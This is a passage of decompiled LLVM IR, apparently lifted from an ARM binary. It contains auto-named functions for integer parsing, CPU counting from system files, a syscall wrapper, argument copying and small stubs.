  %v1_11b08 = urem i32 %v0_11af4, 256
  store i32 %v1_11b08, i32* %sl.global-to-local, align 4
  %v0_11b0c = call i32 @function_cb30()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_11b0c, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v0_11b24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b20:                               ; preds = %bb63, %dec_label_pc_11b80
  %v0_11b20 = phi i32 [ %v1_11b6036, %bb63 ], [ %v0_11b20.pre, %dec_label_pc_11b80 ]
  store i32 %v0_11b20, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11af0, %dec_label_pc_11b20
  %v0_11b60 = phi i32 [ %v0_11b24.pre, %dec_label_pc_11af0 ], [ %v0_11b20, %dec_label_pc_11b20 ]
  %v1_11b24 = inttoptr i32 %v0_11b60 to i8*
  %v2_11b24 = load i8, i8* %v1_11b24, align 1
  %v3_11b24 = zext i8 %v2_11b24 to i32
  %v1_11b28 = add nsw i32 %v3_11b24, -48
  %v1_11b2c = urem i32 %v1_11b28, 256
  %v1_11b34 = or i32 %v3_11b24, 32
  %tmp71 = icmp ult i32 %v1_11b2c, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_11b3c

dec_label_pc_11b3c:                               ; preds = %dec_label_pc_11b24
  %tmp72 = icmp ugt i32 %v1_11b34, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_11b3c
  %v1_11b40 = add nsw i32 %v1_11b34, -87
  %v5_11b48 = urem i32 %v1_11b40, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_11b24, %dec_label_pc_11b3c, %bb57
  %v3_11b78 = phi i32 [ %v1_11b2c, %dec_label_pc_11b24 ], [ 40, %dec_label_pc_11b3c ], [ %v5_11b48, %bb57 ]
  %v1_11b4c = load i32, i32* %r5.global-to-local, align 4
  %v6_11b50 = icmp slt i32 %v3_11b78, %v1_11b4c
  br i1 %v6_11b50, label %dec_label_pc_11b54, label %dec_label_pc_11b9c.loopexit

dec_label_pc_11b54:                               ; preds = %bb58
  %v0_11b54 = load i32, i32* @ip, align 4
  %v1_11b54 = load i32, i32* %r8.global-to-local, align 4
  %v9_11b54 = icmp eq i32 %v0_11b54, %v1_11b54
  br i1 %v9_11b54, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_11b54
  %v1_11b6032 = add i32 %v0_11b60, 1
  store i32 %v1_11b6032, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b68

bb59:                                             ; preds = %dec_label_pc_11b54
  %v3_11b54 = icmp ult i32 %v0_11b54, %v1_11b54
  %v1_11b60 = add i32 %v0_11b60, 1
  store i32 %v1_11b60, i32* %r4.global-to-local, align 4
  br i1 %v3_11b54, label %dec_label_pc_11b68, label %dec_label_pc_11b80

dec_label_pc_11b68:                               ; preds = %bb59, %.thread31
  %v1_11b6036 = phi i32 [ %v1_11b6032, %.thread31 ], [ %v1_11b60, %bb59 ]
  %v4_11b702235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_11b68 = load i32, i32* %sl.global-to-local, align 4
  %v3_11b68 = icmp uge i32 %v3_11b78, %v1_11b68
  %v9_11b68 = icmp eq i32 %v3_11b78, %v1_11b68
  %v2_11b6c = xor i1 %v3_11b68, true
  %v3_11b6c = or i1 %v9_11b68, %v2_11b6c
  br i1 %v3_11b6c, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_11b68
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_11b68, %bb60
  %v4_11b70 = phi i32 [ %v4_11b702235, %dec_label_pc_11b68 ], [ 0, %bb60 ]
  %v2_11b70 = xor i1 %v9_11b68, true
  %v3_11b70 = and i1 %v3_11b68, %v2_11b70
  br i1 %v3_11b70, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_11b70 = urem i32 %v4_11b70, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_11b74 = phi i32 [ %v5_11b70, %bb62 ], [ %v4_11b70, %bb61 ]
  %v2_11b74 = icmp eq i32 %v0_11b74, 0
  br i1 %v2_11b74, label %bb63, label %dec_label_pc_11b80

bb63:                                             ; preds = %thread-pre-split
  %v4_11b78 = mul i32 %v0_11b54, %v1_11b4c
  %v5_11b78 = add i32 %v4_11b78, %v3_11b78
  store i32 %v5_11b78, i32* @ip, align 4
  br label %dec_label_pc_11b20

dec_label_pc_11b80:                               ; preds = %bb59, %thread-pre-split
  %v0_11b80 = call i32 @function_d0ec()
  %v0_11b88 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11b88, i32* @ip, align 4
  %v0_11b8c = load i32, i32* @r7, align 4
  %v2_11b8c = and i32 %v0_11b8c, %v0_11a50
  store i32 %v2_11b8c, i32* @r7, align 4
  %v2_11b94 = inttoptr i32 %v0_11b80 to i32*
  store i32 34, i32* %v2_11b94, align 4
  %v0_11b20.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b20

dec_label_pc_11b9c.loopexit:                      ; preds = %bb58
  %v0_11b9c.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %.thread, %dec_label_pc_11b9c.loopexit
  %v2_11ba0 = phi i32 [ %v0_11b9c.pre, %dec_label_pc_11b9c.loopexit ], [ %v0_11a44, %.thread ]
  %v2_11b9c = icmp eq i32 %v2_11ba0, 0
  br i1 %v2_11b9c, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_11b9c
  %v1_11ba0 = load i32, i32* %r6.global-to-local, align 4
  %v3_11ba0 = inttoptr i32 %v2_11ba0 to i32*
  store i32 %v1_11ba0, i32* %v3_11ba0, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_11b9c, %bb64
  %v0_11ba8 = load i32, i32* @r7, align 4
  %v2_11ba8 = icmp eq i32 %v0_11ba8, 0
  %. = select i1 %v2_11ba8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_11bb4 = icmp eq i32 %v0_11a50, 0
  %v0_11bd8.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_11bb4, label %dec_label_pc_11bd0, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_11bd8.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_11bc0, label %dec_label_pc_11bd0

dec_label_pc_11bc0:                               ; preds = %bb68
  %v0_11bc0 = call i32 @function_d0ec()
  %v2_11bc8 = inttoptr i32 %v0_11bc0 to i32*
  store i32 34, i32* %v2_11bc8, align 4
  %v0_11bcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11bcc, i32* @ip, align 4
  %v0_11bd0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %bb68, %bb65, %dec_label_pc_11bc0
  %v0_11bd8.pre = phi i32 [ %v0_11bd8.pre.pre, %bb68 ], [ %v0_11bcc, %dec_label_pc_11bc0 ], [ %v0_11bd8.pre.pre, %bb65 ]
  %v0_11bd0 = phi i32 [ %v0_11ba8, %bb68 ], [ %v0_11bd0.pre, %dec_label_pc_11bc0 ], [ %v0_11ba8, %bb65 ]
  %v2_11bd0 = icmp eq i32 %v0_11bd0, 0
  br i1 %v2_11bd0, label %dec_label_pc_11bd0._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_11bd0
  %v2_11bd4 = sub i32 0, %v0_11bd8.pre
  store i32 %v2_11bd4, i32* @ip, align 4
  br label %dec_label_pc_11bd0._crit_edge

dec_label_pc_11bd0._crit_edge:                    ; preds = %dec_label_pc_11bd0, %bb69
  %v0_11bd8 = phi i32 [ %v2_11bd4, %bb69 ], [ %v0_11bd8.pre, %dec_label_pc_11bd0 ]
  store i32 %v3_11a30, i32* @r4, align 4
  store i32 %v12_11a30, i32* @r7, align 4
  ret i32 %v0_11bd8

; uselistorder directives
  uselistorder i32 %v0_11bd8.pre, { 1, 0 }
  uselistorder i32 %v0_11bd8.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_11b70, { 1, 0 }
  uselistorder i1 %v3_11b68, { 1, 0 }
  uselistorder i32 %v1_11b68, { 1, 0 }
  uselistorder i32 %v1_11b34, { 1, 0 }
  uselistorder i32 %v1_11b2c, { 1, 0 }
  uselistorder i32 %v0_11b60, { 1, 0, 2 }
  uselistorder i32 %v0_11b20, { 1, 0 }
  uselistorder i32 %v3_11ad0, { 1, 0 }
  uselistorder i32 %v1_11ac4, { 1, 0, 2 }
  uselistorder i32 %v0_11a94, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11a50, { 1, 0 }
  uselistorder i32 %v0_11a48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_11bd0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11bd0, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_11b9c, { 1, 0 }
  uselistorder label %dec_label_pc_11b80, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b24, { 1, 0 }
  uselistorder label %dec_label_pc_11b20, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a98, { 1, 0 }
  uselistorder label %dec_label_pc_11a94, { 1, 0 }
  uselistorder label %dec_label_pc_11a5c, { 1, 0 }
}

define i32 @function_11bf0(i32 %arg1) local_unnamed_addr {
dec_label_pc_11bf0:
  %stack_var_-16 = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_11274.441 to i32), i32 72704), i32* @r5, align 4
  %v4_11bfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_11274.441 to i32), i32 72796) to i32*), align 4
  store i32 %v4_11bfc, i32* @r4, align 4
  %v2_11c04 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_11c1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_11274.441 to i32), i32 72780) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11c1c)
  %v0_11c30 = load i32, i32* @r5, align 4
  %v2_11c30 = add i32 %v0_11c30, 16
  %v3_11c30 = inttoptr i32 %v2_11c30 to i32*
  %v4_11c30 = load i32, i32* %v3_11c30, align 4
  call void @__pseudo_branch(i32 %v4_11c30)
  %v4_11c40 = load i32, i32* @global_var_25854.501, align 4
  %v2_11c44 = icmp eq i32 %v4_11c40, 0
  br i1 %v2_11c44, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_11bf0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11bf0, %bb
  %v2_11c50 = xor i1 %v2_11c44, true
  call void @__pseudo_cond_branch(i1 %v2_11c50, i32 %v4_11c40)
  store i32 %v2_11c04, i32* @r0, align 4
  %v0_11c60 = load i32, i32* @r5, align 4
  %v2_11c60 = add i32 %v0_11c60, 24
  %v3_11c60 = inttoptr i32 %v2_11c60 to i32*
  %v4_11c60 = load i32, i32* %v3_11c60, align 4
  call void @__pseudo_branch(i32 %v4_11c60)
  %v0_11c6c = call i32 @function_12568()
  %v0_11c74 = load i32, i32* @r5, align 4
  %v9_11c74 = icmp eq i32 %v0_11c74, 86764
  br i1 %v9_11c74, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_11c7c = xor i1 %v9_11c74, true
  call void @__pseudo_cond_branch(i1 %v2_11c7c, i32 ptrtoint (i32* @global_var_db88.504 to i32))
  %v0_11c80 = load i32, i32* @r6, align 4
  %v1_11c84 = call i32 @function_12ec0(i32 %v0_11c80)
  %v0_11c88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c88, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_11c88 = load i32, i32* @r1, align 4
  %v2_11c88 = load i32, i32* @r4, align 4
  %v3_11c88 = load i32, i32* @r2, align 4
  %v4_11c88 = lshr i32 %v2_11c88, %v3_11c88
  %v5_11c88 = sub i32 32, %v3_11c88
  %v6_11c88 = shl i32 %v2_11c88, %v5_11c88
  %v7_11c88 = or i32 %v6_11c88, %v4_11c88
  %v9_11c88 = and i32 %v7_11c88, %v1_11c88
  store i32 %v9_11c88, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_11ca0 = phi i32 [ %v1_11c84, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_11ca0

; uselistorder directives
  uselistorder i1 %v9_11c74, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_11ca8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ca8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_11ca8 = load i32, i32* @r4, align 4
  %v6_11ca8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_11cac = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_11cac, label %dec_label_pc_11d40, label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11ca8
  %v2_11ccc = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v6_11ce0 = call i32 @function_129e0(i32 17, i32 0, i32 %v2_11ccc, i32 65536, i32 65536, i32 0)
  %v3_11ce4 = load i32, i32* %stack_var_-44, align 4
  %v7_11ce8 = icmp eq i32 %v3_11ce4, 1
  br i1 %v7_11ce8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11cbc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11cbc, %bb
  call void @__pseudo_cond_branch(i1 %v7_11ce8, i32 ptrtoint (i32* @global_var_12eec.506 to i32))
  %v2_11cfc = ptrtoint i32* %stack_var_-16 to i32
  %v2_11d04 = call i32 @function_12e18(i32 %v2_11cfc, i32 %v2_11cfc)
  %v2_11d08 = icmp eq i32 %v2_11d04, 0
  br i1 %v2_11d08, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_11d1c = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_11d1c, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_11d2c = load i32, i32* %stack_var_-24, align 4
  %v1_11d30 = and i32 %v3_11d2c, 65536
  %v2_11d30 = icmp eq i32 %v1_11d30, 0
  br i1 %v2_11d30, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_11d30, i32 ptrtoint (i32* @global_var_12eec.506 to i32))
  %v0_11d40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11ca8, %.thread6
  %v0_11d40 = phi i32 [ %v0_11d40.pre, %.thread6 ], [ 0, %dec_label_pc_11ca8 ]
  store i32 %v3_11ca8, i32* @r4, align 4
  store i32 %v6_11ca8, i32* @lr, align 4
  ret i32 %v0_11d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_129e0, { 1, 0 }
  uselistorder label %dec_label_pc_11d40, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11d54() local_unnamed_addr {
dec_label_pc_11d54:
  %stack_var_-36 = alloca i32, align 4
  store i32 142964, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1a6ec.510 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_11d74 = call i32 @function_13694(i32 ptrtoint ([11 x i8]* @global_var_1a6ec.510 to i32))
  store i32 %v2_11d74, i32* @r6, align 4
  %v2_11d78 = icmp eq i32 %v2_11d74, 0
  br i1 %v2_11d78, label %dec_label_pc_11df8, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d54
  store i32 920, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_1a6f8.513 to i32), i32* @r8, align 4
  %v2_11d8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11d8c, i32* @r7, align 4
  br label %bb18

dec_label_pc_11d94:                               ; preds = %bb18
  %v3_11d94 = load i32, i32* %stack_var_-36, align 4
  %v1_11d98 = inttoptr i32 %v3_11d94 to i32*
  %v2_11d98 = load i32, i32* %v1_11d98, align 4
  %v1_11d9c = inttoptr i32 %v2_11d98 to i8*
  %v2_11d9c = load i8, i8* %v1_11d9c, align 1
  %v7_11da0 = icmp eq i8 %v2_11d9c, 99
  br i1 %v7_11da0, label %dec_label_pc_11da8, label %.backedge3

dec_label_pc_11da8:                               ; preds = %dec_label_pc_11d94
  %v1_11da8 = add i32 %v2_11d98, 1
  %v2_11da8 = inttoptr i32 %v1_11da8 to i8*
  %v3_11da8 = load i8, i8* %v2_11da8, align 1
  %v7_11dac = icmp eq i8 %v3_11da8, 112
  br i1 %v7_11dac, label %dec_label_pc_11db4, label %.backedge3

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11da8
  %v1_11db4 = add i32 %v2_11d98, 2
  %v2_11db4 = inttoptr i32 %v1_11db4 to i8*
  %v3_11db4 = load i8, i8* %v2_11db4, align 1
  %v7_11db8 = icmp eq i8 %v3_11db4, 117
  br i1 %v7_11db8, label %dec_label_pc_11dc0, label %.backedge3

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11db4
  %v1_11dc0 = add i32 %v2_11d98, 3
  %v2_11dc0 = inttoptr i32 %v1_11dc0 to i8*
  %v3_11dc0 = load i8, i8* %v2_11dc0, align 1
  %v4_11dc0 = zext i8 %v3_11dc0 to i32
  %v0_11dc4 = load i32, i32* @r4, align 4
  %v1_11dc4 = load i32, i32* @sl, align 4
  %v2_11dc4 = add i32 %v1_11dc4, %v0_11dc4
  %v3_11dc4 = inttoptr i32 %v2_11dc4 to i32*
  %v4_11dc4 = load i32, i32* %v3_11dc4, align 4
  %v2_11dc8 = mul nuw nsw i32 %v4_11dc0, 2
  %v2_11dcc = add i32 %v4_11dc4, %v2_11dc8
  %v3_11dcc = inttoptr i32 %v2_11dcc to i16*
  %v4_11dcc = load i16, i16* %v3_11dcc, align 2
  %v1_11dd0 = and i16 %v4_11dcc, 8
  %v2_11dd0 = icmp eq i16 %v1_11dd0, 0
  br i1 %v2_11dd0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_11dc0
  %v1_11dd4 = load i32, i32* @r5, align 4
  %v2_11dd4 = add i32 %v1_11dd4, 1
  store i32 %v2_11dd4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_11dc0, %dec_label_pc_11d94, %dec_label_pc_11da8, %dec_label_pc_11db4
  %v0_11dd8.pre = load i32, i32* @r6, align 4
  %v0_11de4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_11d80
  %v0_11de4 = phi i32 [ %v0_11de4.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_1a6f8.513 to i32), %dec_label_pc_11d80 ]
  %v0_11dd8 = phi i32 [ %v0_11dd8.pre, %.backedge3 ], [ %v2_11d74, %dec_label_pc_11d80 ]
  %v4_11de8 = inttoptr i32 %v0_11dd8 to i32*
  %v5_11de8 = call i32 @function_13338(i32* %v4_11de8, i32 %v2_11d8c, i32 258, i32 %v0_11de4)
  %v2_11dec = icmp eq i32 %v5_11de8, 0
  br i1 %v2_11dec, label %dec_label_pc_11e5c, label %dec_label_pc_11d94

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11d54
  store i32 ptrtoint ([14 x i8]* @global_var_1a6fc.516 to i32), i32* @r0, align 4
  %v2_11e00 = call i32 @function_13694(i32 ptrtoint ([14 x i8]* @global_var_1a6fc.516 to i32))
  store i32 %v2_11e00, i32* @r6, align 4
  %v2_11e04 = icmp eq i32 %v2_11e00, 0
  br i1 %v2_11e04, label %bb19, label %dec_label_pc_11e10

bb19:                                             ; preds = %dec_label_pc_11df8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11e5c

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11df8
  store i32 ptrtoint ([10 x i8]* @global_var_1a70c.518 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1a730.520 to i32), i32* @r7, align 4
  %v2_11e20 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11e20, i32* @r4, align 4
  br label %bb21

dec_label_pc_11e28:                               ; preds = %bb21
  %v0_11e54 = load i32, i32* @r8, align 4
  %v1_11e54 = inttoptr i32 %v0_11e54 to i8*
  %v3_11e28 = load i32, i32* %stack_var_-36, align 4
  %v1_11e2c = inttoptr i32 %v3_11e28 to i32*
  %v2_11e2c = load i32, i32* %v1_11e2c, align 4
  store i32 %v2_11e2c, i32* @r1, align 4
  %v4_11e30 = call i32 @function_f6e0(i8* %v1_11e54, i32 %v2_11e2c)
  %v2_11e34 = icmp eq i32 %v4_11e30, 0
  br i1 %v2_11e34, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_11e28
  %v1_11e38 = load i32, i32* @r5, align 4
  %v2_11e38 = add i32 %v1_11e38, 1
  store i32 %v2_11e38, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_11e28
  %v0_11e44.pre = load i32, i32* @r7, align 4
  %v0_11e48.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_11e10
  %v0_11e48 = phi i32 [ %v0_11e48.pre, %.backedge ], [ %v2_11e00, %dec_label_pc_11e10 ]
  %v0_11e44 = phi i32 [ %v0_11e44.pre, %.backedge ], [ ptrtoint (i32* @global_var_1a730.520 to i32), %dec_label_pc_11e10 ]
  %v4_11e4c = inttoptr i32 %v0_11e48 to i32*
  %v5_11e4c = call i32 @function_13338(i32* %v4_11e4c, i32 %v2_11e20, i32 459266, i32 %v0_11e44)
  %v2_11e50 = icmp eq i32 %v5_11e4c, 0
  br i1 %v2_11e50, label %dec_label_pc_11e5c, label %dec_label_pc_11e28

dec_label_pc_11e5c:                               ; preds = %bb18, %bb21, %bb19
  %v0_11e5c = load i32, i32* @r6, align 4
  %v1_11e60 = inttoptr i32 %v0_11e5c to i32*
  %v2_11e60 = call i32 @function_13660(i32* %v1_11e60)
  %v0_11e64 = load i32, i32* @r5, align 4
  %v2_11e64 = icmp eq i32 %v0_11e64, 0
  %.v0_11e64 = select i1 %v2_11e64, i32 1, i32 %v0_11e64
  ret i32 %.v0_11e64

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_11e5c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_11ea0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11ea0:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_12288

bb:                                               ; preds = %dec_label_pc_11ea0
  %v7_11eb4 = mul i32 %arg1, 4
  %v8_11eb4 = add i32 %v7_11eb4, ptrtoint (i32* @global_var_11ebc.523 to i32)
  call void @__pseudo_branch(i32 %v8_11eb4)
  br label %dec_label_pc_12288

dec_label_pc_12288:                               ; preds = %bb, %dec_label_pc_11ea0
  %v0_12288 = call i32 @function_d0ec()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12294 = inttoptr i32 %v0_12288 to i32*
  store i32 22, i32* %v2_12294, align 4
  %v0_12444 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_12444

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12478(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12478:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_12478 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_12478, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_1248c = ptrtoint i32* %stack_var_-40 to i32
  %v2_12490 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_124a0, %dec_label_pc_12478
  %v0_124b4 = phi i32 [ 0, %dec_label_pc_12478 ], [ %v1_124b4, %dec_label_pc_124a0 ]
  %stack_var_-36.0 = phi i32 [ %v2_12490, %dec_label_pc_12478 ], [ %v1_124a8, %dec_label_pc_124a0 ]
  %v1_124a4 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_124a4 = load i32, i32* %v1_124a4, align 4
  %v1_124a8 = add i32 %stack_var_-36.0, 4
  %v2_124ac = icmp eq i32 %v2_124a4, 0
  %v1_124b4 = add i32 %v0_124b4, 1
  store i32 %v1_124b4, i32* @lr, align 4
  br i1 %v2_124ac, label %dec_label_pc_124bc, label %dec_label_pc_124a0

dec_label_pc_124bc:                               ; preds = %dec_label_pc_124a0
  %v3_124bc = mul i32 %v1_124b4, 4
  %v1_124c0 = add i32 %v3_124bc, 18
  %v1_124c4 = and i32 %v1_124c0, -8
  %v2_124c8 = sub i32 %v2_1248c, %v1_124c4
  %v2_124d0 = inttoptr i32 %v2_124c8 to i32*
  store i32 %arg2, i32* %v2_124d0, align 4
  %v0_124dc = load i32, i32* @sp, align 4
  store i32 %v0_124dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_124e4

dec_label_pc_124e4:                               ; preds = %dec_label_pc_124e4, %dec_label_pc_124bc
  %v1_124f8 = phi i32 [ %v0_124dc, %dec_label_pc_124bc ], [ %v5_124f8, %dec_label_pc_124e4 ]
  %stack_var_-36.1 = phi i32 [ %v2_12490, %dec_label_pc_124bc ], [ %v1_124f0, %dec_label_pc_124e4 ]
  %v1_124e8 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_124e8 = load i32, i32* %v1_124e8, align 4
  %v0_124ec = load i32, i32* @lr, align 4
  %v1_124ec = add i32 %v0_124ec, -1
  store i32 %v1_124ec, i32* @lr, align 4
  %v7_124ec = icmp eq i32 %v0_124ec, 1
  %v1_124f0 = add i32 %stack_var_-36.1, 4
  %v2_124f8 = add i32 %v1_124f8, 4
  %v3_124f8 = inttoptr i32 %v2_124f8 to i32*
  store i32 %v2_124e8, i32* %v3_124f8, align 4
  %v4_124f8 = load i32, i32* %ip.global-to-local, align 4
  %v5_124f8 = add i32 %v4_124f8, 4
  store i32 %v5_124f8, i32* %ip.global-to-local, align 4
  br i1 %v7_124ec, label %dec_label_pc_12500, label %dec_label_pc_124e4

dec_label_pc_12500:                               ; preds = %dec_label_pc_124e4
  %v0_1250c = call i32 @function_12b28()
  ret i32 %v0_1250c

; uselistorder directives
  uselistorder i32 %v5_124f8, { 1, 0 }
  uselistorder i32 %v0_124ec, { 1, 0 }
  uselistorder i32 %v1_124b4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_12520(i32 %arg1) local_unnamed_addr {
dec_label_pc_12520:
  %v0_12520 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12520, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_12520
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_12520, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1252c() local_unnamed_addr {
dec_label_pc_1252c:
  ret i32 0
}

define i32 @function_12534(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12534:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_12534 = add i32 %tmp, 4
  %v4_12534 = inttoptr i32 %v3_12534 to i32*
  store i32 %arg3, i32* %v4_12534, align 4
  ret i32 %tmp
}

define i32 @function_1253c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1253c:
  %v2_12540 = icmp eq i32 %arg2, 0
  br i1 %v2_12540, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1253c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1253c, %bb
  %v3_12558 = call i32 @unknown_0()
  ret i32 %v3_12558

; uselistorder directives
